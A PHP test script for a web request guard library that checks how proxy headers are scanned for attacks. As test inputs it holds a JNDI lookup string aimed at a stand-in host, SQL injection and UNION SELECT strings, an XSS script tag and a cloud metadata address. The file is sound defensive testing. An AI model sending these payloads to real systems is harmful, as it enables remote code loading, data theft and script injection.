<?php

declare(strict_types=1);

use RenzoFranceschini\GuardCore\Config\SecurityConfig;
use RenzoFranceschini\GuardCore\Detection\HeaderExclusions;
use RenzoFranceschini\GuardCore\Detection\SusPatterns;
use RenzoFranceschini\GuardCore\Pipeline\Checks\SuspiciousActivityCheck;
use RenzoFranceschini\GuardCore\Request\GuardResponse;
use RenzoFranceschini\GuardCore\Request\GuardResponseFactory;
use RenzoFranceschini\GuardCore\Request\SimpleGuardRequest;
use RenzoFranceschini\GuardCore\Routing\RouteResolver;

require __DIR__ . '/../vendor/autoload.php';

/**
 * Honesty tests for the excluded-header detection surface (port of
 * tests/test_detection_excluded_proxy_headers.py plus the header cases of
 * tests/test_detection_exclusion_integration.py).
 *
 * The excluded-header surface is the hardcoded proxy identity set
 * (HeaderExclusions::DEFAULT_EXCLUDED_HEADERS, the reference's
 * _DEFAULT_EXCLUDED_HEADERS) merged with the config field
 * excluded_detection_headers. An excluded header is not skipped: like the
 * reference's _scan_excluded_header_component it scans with every enabled
 * category except the ssrf skip resolved by
 * HeaderExclusions::skipCategories (address-carrying headers and
 * address-chain values), so a bare proxy address no longer false-positives
 * ssrf while sqli, xss and always-scan cmd_injection payloads in the same
 * header still detect.
 */

final class T
{
    public int $passed = 0;
    public int $failed = 0;

    public function same(mixed $expected, mixed $actual, string $label): void
    {
        if ($expected === $actual) {
            $this->passed++;
            echo "ok - {$label}\n";
        } else {
            $this->failed++;
            echo "FAIL - {$label}\n";
            echo '  expected: ' . var_export($expected, true) . "\n";
            echo '  actual:   ' . var_export($actual, true) . "\n";
        }
    }

    public function section(string $name): void
    {
        echo "\n=== {$name} ===\n";
    }
}

function makeCheck(?SecurityConfig $config = null): SuspiciousActivityCheck
{
    $config = $config ?? new SecurityConfig();

    return new SuspiciousActivityCheck(
        $config,
        new GuardResponseFactory(),
        new SusPatterns($config->detectionSemanticThreshold),
        null,
        new RouteResolver()
    );
}

/** @param array<string, string> $headers */
function blockedHeaders(SuspiciousActivityCheck $check, array $headers): bool
{
    $request = new SimpleGuardRequest(urlPath: '/items', method: 'POST', headers: $headers);
    $request->state()->clientIp = '9.9.9.9';

    return $check->check($request) instanceof GuardResponse;
}

const SCRIPT = '<script>alert(1)</script>';
const JNDI = '${jndi:ldap://evil.example/a}';
const SQLI = "203.0.113.10' OR '1'='1";

$t = new T();

$t->section('address-carrying proxy identity headers are not flagged by default');
$t->same(false, blockedHeaders(makeCheck(), ['x-forwarded-for' => '192.168.65.1']), 'x-forwarded-for private address does not block');
$t->same(false, blockedHeaders(makeCheck(), ['x-real-ip' => '10.0.0.5, 172.16.0.1']), 'x-real-ip address chain does not block');
$t->same(false, blockedHeaders(makeCheck(), ['cf-connecting-ip' => '127.0.0.1']), 'cf-connecting-ip loopback does not block');
$t->same(false, blockedHeaders(makeCheck(), ['x-envoy-external-address' => '127.0.0.1:8080']), 'envoy address with port does not block');
$t->same(false, blockedHeaders(makeCheck(), ['host' => '169.254.169.254']), 'host metadata address does not block');

$t->section('structured proxy header realistic values are not flagged');
$t->same(false, blockedHeaders(makeCheck(), ['forwarded' => 'for=127.0.0.1;proto=https']), 'forwarded entry does not block');
$t->same(false, blockedHeaders(makeCheck(), ['x-forwarded-proto' => 'https']), 'x-forwarded-proto value does not block');

$t->section('excluded headers still scan always-scan and per-category payloads');
$t->same(true, blockedHeaders(makeCheck(), ['x-forwarded-for' => JNDI]), 'jndi in x-forwarded-for still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['user-agent' => JNDI]), 'jndi in user-agent still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['x-real-ip' => JNDI]), 'jndi in x-real-ip still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['x-forwarded-for' => SQLI]), 'sqli in x-forwarded-for still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['user-agent' => SCRIPT]), 'xss in user-agent still blocks');

$t->section('non-excluded headers keep the full category scan');
$t->same(true, blockedHeaders(makeCheck(), ['x-not-a-proxy-header' => '192.168.65.1']), 'private address in an unknown header blocks');
$t->same(true, blockedHeaders(makeCheck(), ['x-plain-header' => "1 UNION SELECT username, password FROM users--"]), 'sqli in an unknown header blocks');

$t->section('configured exclusions suppress ssrf only');
$excluded = new SecurityConfig(excludedDetectionHeaders: ['x-custom-proxy-ip']);
$t->same(false, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => '10.0.0.5']), 'excluded custom header with address does not block');
$t->same(false, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => '10.0.0.5, 172.16.0.1']), 'excluded custom header with address chain does not block');
$t->same(true, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => SCRIPT]), 'excluded custom header with xss still blocks');
$t->same(true, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => JNDI]), 'excluded custom header with jndi still blocks');
$t->same(true, blockedHeaders(makeCheck($excluded), ['x-other-header' => '192.168.65.1']), 'non-excluded header keeps the ssrf hit');
$t->same(true, blockedHeaders(makeCheck(), ['x-custom-proxy-ip' => '10.0.0.5']), 'without config the same custom address blocks');

$t->section('skip only applies within the enabled categories');
$ssrfOnly = new SecurityConfig(enabledDetectionCategories: ['ssrf']);
$t->same(false, blockedHeaders(makeCheck($ssrfOnly), ['x-real-ip' => '169.254.169.254']), 'excluded header with ssrf-only enabled skips entirely');
$t->same(true, blockedHeaders(makeCheck(new SecurityConfig(enabledDetectionCategories: ['ssrf'])), ['x-unknown' => '169.254.169.254']), 'non-excluded header with ssrf-only enabled still blocks');

$t->section('HeaderExclusions helpers');
$t->same([], HeaderExclusions::skipCategories('x-custom', '<script>alert(1)</script>'), 'non-address value on an unknown header skips nothing');
$t->same(['ssrf' => true], HeaderExclusions::skipCategories('x-custom', '10.0.0.5'), 'address value on an unknown header skips ssrf');
$t->same(['ssrf' => true], HeaderExclusions::skipCategories('X-Forwarded-For', 'anything'), 'address-carrying header skips ssrf for any value');
$t->same([], HeaderExclusions::skipCategories('  Referer  ', 'anything'), 'default-excluded non-address header skips nothing');

$t->same('1.2.3.4', HeaderExclusions::stripForwardedEntryPort('1.2.3.4'), 'bare IPv4 keeps');
$t->same('1.2.3.4', HeaderExclusions::stripForwardedEntryPort('1.2.3.4:8080'), 'IPv4 port strips');
$t->same('::1', HeaderExclusions::stripForwardedEntryPort('[::1]:8080'), 'bracketed IPv6 with port strips');
$t->same('[::1]junk', HeaderExclusions::stripForwardedEntryPort('[::1]junk'), 'bracketed form with junk tail keeps');
$t->same('2001:db8::1', HeaderExclusions::stripForwardedEntryPort('2001:db8::1'), 'bare IPv6 keeps');
$t->same('example.com', HeaderExclusions::stripForwardedEntryPort('example.com:80'), 'hostname port strips');

$t->same(true, HeaderExclusions::valueLooksLikeAddressChain('192.168.65.1'), 'single private IP is a chain');
$t->same(true, HeaderExclusions::valueLooksLikeAddressChain('10.0.0.5, 172.16.0.1'), 'comma-separated IPs are a chain');
$t->same(true, HeaderExclusions::valueLooksLikeAddressChain('[::1]:9090, 10.0.0.1'), 'mixed bracketed IPv6 and IPv4 are a chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain(''), 'empty value is not a chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain('not-an-ip'), 'bare word is not a chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain('10.0.0.5, evil.example'), 'one non-IP token breaks the chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain(SCRIPT), 'xss payload is not a chain');

$merged = HeaderExclusions::mergedExcludedNames(['X-Custom-Proxy' => true]);
$t->same(true, isset($merged['x-custom-proxy']), 'configured entries merge lowercased');
$t->same(true, isset($merged['x-forwarded-for']), 'default set stays merged in');
$t->same(count(HeaderExclusions::DEFAULT_EXCLUDED_HEADERS) + 1, count($merged), 'merge only adds the configured entry');

$t->section('config field validation and immutability');
$t->same([], array_keys((new SecurityConfig())->excludedDetectionHeaders), 'excludedDetectionHeaders defaults empty');
$t->same(['search'], array_keys((new SecurityConfig(excludedDetectionHeaders: ['search']))->excludedDetectionHeaders), 'header entries kept verbatim');
try {
    new SecurityConfig(excludedDetectionHeaders: 'x-custom');
    $t->same(true, false, 'bare string header exclusion rejected');
} catch (TypeError) {
    $t->same(true, true, 'bare string header exclusion rejected');
}
$threw = false;
try {
    new SecurityConfig(excludedDetectionHeaders: ['x-custom', 3]);
} catch (\InvalidArgumentException) {
    $threw = true;
}
$t->same(true, $threw, 'non-string entry rejected');
$base = new SecurityConfig();
$mutated = $base->with(['excluded_detection_headers' => ['x-late']]);
$t->same([], array_keys($base->excludedDetectionHeaders), 'with() leaves the original untouched');
$t->same(['x-late'], array_keys($mutated->excludedDetectionHeaders), 'with() carries the new exclusion');

$t->section('empty exclusion config keeps current behavior');
$t->same(true, blockedHeaders(makeCheck(), ['x-plain-header' => SCRIPT]), 'header attack blocks with no exclusions');
$t->same(false, blockedHeaders(makeCheck(), ['user-agent' => 'Mozilla/5.0', 'accept' => 'application/json']), 'benign proxy identity values do not block');

echo "\npassed={$t->passed} failed={$t->failed}\n";
exit($t->failed === 0 ? 0 : 1);
